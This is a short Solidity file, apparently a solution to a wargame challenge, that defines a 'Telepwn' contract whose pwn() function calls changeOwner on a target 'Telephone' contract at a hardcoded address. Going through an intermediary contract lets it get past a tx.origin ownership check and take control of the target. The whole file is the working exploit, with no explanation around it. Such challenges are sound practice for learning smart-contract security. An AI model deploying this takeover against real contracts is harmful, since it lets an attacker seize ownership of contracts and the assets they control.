import "./telephone.sol";

contract Telepwn {
    Telephone public originalContract = Telephone(0x6431717d9f7F57574Eab2eeCaaf526fB89624987);
    
    function pwn() public{
        originalContract.changeOwner(0xD582CceD9A74C83faA680D9bAa32781e829fED5a);
    }
    
}